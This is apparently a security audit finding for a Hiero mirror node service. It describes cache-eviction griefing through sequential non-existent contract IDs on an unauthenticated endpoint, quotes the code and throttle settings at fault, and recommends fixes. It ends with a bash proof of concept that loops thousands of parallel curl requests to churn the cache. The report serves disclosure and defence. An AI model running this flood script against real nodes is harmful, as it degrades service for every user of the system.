### Title
Unauthenticated Cache Eviction via Sequential Contract ID Enumeration in `findRuntimeBytecode`

### Summary
The `findRuntimeBytecode` method in `ContractRepository` uses a Caffeine LRU cache with `maximumSize=1000` and `expireAfterAccess=1h`. Because the `@Cacheable` annotation uses `unless = "#result == null"` and `Optional.empty()` is not `null`, lookups for non-existent contract IDs are also cached. An unprivileged attacker can enumerate sequential non-existent contract IDs via the unauthenticated `/api/v1/contracts/call` endpoint to fill and continuously churn the cache, evicting legitimate bytecode entries and forcing repeated database hits for all users.

### Finding Description
**Exact code path:**

`ContractRepository.java` line 16–18:
```java
@Cacheable(cacheNames = CACHE_NAME_CONTRACT, cacheManager = CACHE_MANAGER_CONTRACT, unless = "#result == null")
@Query(value = "select runtime_bytecode from contract where id = :contractId", nativeQuery = true)
Optional<byte[]> findRuntimeBytecode(final Long contractId);
```

`CacheProperties.java` line 22:
```java
private String contract = "expireAfterAccess=1h,maximumSize=1000,recordStats";
```

**Root cause:** The `unless = "#result == null"` condition only skips caching when the return value is Java `null`. `Optional.empty()` is a non-null object, so a lookup for a non-existent `contractId` returns `Optional.empty()`, which is stored in the cache. This means an attacker can fill all 1000 cache slots with garbage entries (non-existent IDs) at no cost.

**Exploit flow:**
1. Attacker calls `POST /api/v1/contracts/call` with `to` set to long-zero addresses encoding sequential IDs (`0x0000...0001`, `0x0000...0002`, ..., `0x0000...03E8`). Each call triggers `findRuntimeBytecode(id)`, which returns `Optional.empty()` and is cached.
2. After 1000 unique IDs, the cache is full. Attacker continues with IDs 1001+, triggering LRU eviction of the earliest entries.
3. Legitimate users' contract bytecodes are continuously evicted, causing every subsequent legitimate lookup to miss the cache and hit the database.

**Why existing checks fail:**

The global throttle (`ThrottleManagerImpl`) enforces 500 requests/second across all callers with a single shared bucket — there is no per-IP or per-caller rate limiting. An attacker can sustain 500 req/s (filling the 1000-entry cache in ~2 seconds) and then maintain continuous churn indefinitely. The `requestsPerSecond = 500` default is a global ceiling, not a per-source limit.

### Impact Explanation
Every legitimate `eth_call` targeting a contract whose bytecode was evicted incurs an additional synchronous database query (`select runtime_bytecode from contract where id = ?`). Under sustained attack, the effective cache hit rate for bytecode lookups approaches zero, degrading response latency for all users proportionally to DB query overhead. The impact is performance degradation (griefing), not a complete outage, consistent with the Medium scope classification.

### Likelihood Explanation
No authentication, no per-IP rate limit, and no cost (gas, tokens, or fees) is required to call `POST /api/v1/contracts/call`. The attacker only needs to craft HTTP requests with incrementing long-zero EVM addresses. The attack is trivially scriptable, repeatable indefinitely, and requires no on-chain interaction or privileged access.

### Recommendation
1. **Fix the cache condition**: Change `unless = "#result == null"` to `unless = "#result == null || !#result.isPresent()"` so that `Optional.empty()` (non-existent contract) results are not cached, eliminating the ability to fill the cache with junk entries.
2. **Add per-IP rate limiting**: Introduce a per-source-IP token bucket in `ThrottleManagerImpl` or at the reverse-proxy/ingress layer to prevent a single caller from consuming the full global budget.
3. **Consider increasing cache size**: Raising `maximumSize` reduces the relative impact of eviction attacks, though it does not eliminate the root cause.

### Proof of Concept
```bash
# Fill cache with 1000 non-existent contract IDs (takes ~2s at 500 req/s)
for i in $(seq 1 1000); do
  ADDR=$(printf "0x%040x" $i)
  curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
    -H "Content-Type: application/json" \
    -d "{\"to\":\"$ADDR\",\"data\":\"0x\",\"gas\":50000}" &
done
wait

# Continue with IDs 1001+ to trigger continuous LRU eviction
for i in $(seq 1001 9999); do
  ADDR=$(printf "0x%040x" $i)
  curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
    -H "Content-Type: application/json" \
    -d "{\"to\":\"$ADDR\",\"data\":\"0x\",\"gas\":50000}" &
done
```

After this, any legitimate `eth_call` to a real contract will miss the cache and hit the database, observable via increased p99 latency on `/api/v1/contracts/call` responses and elevated DB query rates in metrics (`recordStats` is enabled on the cache). [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/ContractRepository.java (L16-18)
```java
    @Cacheable(cacheNames = CACHE_NAME_CONTRACT, cacheManager = CACHE_MANAGER_CONTRACT, unless = "#result == null")
    @Query(value = "select runtime_bytecode from contract where id = :contractId", nativeQuery = true)
    Optional<byte[]> findRuntimeBytecode(final Long contractId);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L22-22)
```java
    private String contract = "expireAfterAccess=1h,maximumSize=1000,recordStats";
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L35-35)
```java
    private long requestsPerSecond = 500;
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L37-42)
```java
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java (L24-32)
```java
    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }
```
